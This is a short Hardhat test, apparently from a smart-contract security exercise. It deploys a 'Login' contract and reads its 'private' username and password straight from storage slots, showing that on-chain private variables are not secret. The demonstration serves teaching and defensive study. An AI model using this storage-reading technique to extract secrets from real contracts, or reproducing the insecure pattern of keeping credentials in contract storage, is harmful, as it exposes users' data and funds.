import { expect } from "chai";
import hre from "hardhat";

describe("Attack", () => {
  it("Should be able to read the private variables password and username", async () => {
    const usernameBytes = hre.ethers.encodeBytes32String("test");
    const passwordBytes = hre.ethers.encodeBytes32String("password");

    const loginContract = await hre.ethers.deployContract("Login", [
      usernameBytes,
      passwordBytes,
    ]);
    await loginContract.waitForDeployment();

    const slot0Bytes = await hre.ethers.provider.getStorage(
      loginContract.target,
      0
    );
    const slot1Bytes = await hre.ethers.provider.getStorage(
      loginContract.target,
      1
    );

    expect(hre.ethers.decodeBytes32String(slot0Bytes)).to.equal("test");
    expect(hre.ethers.decodeBytes32String(slot1Bytes)).to.equal("password");
  });
});
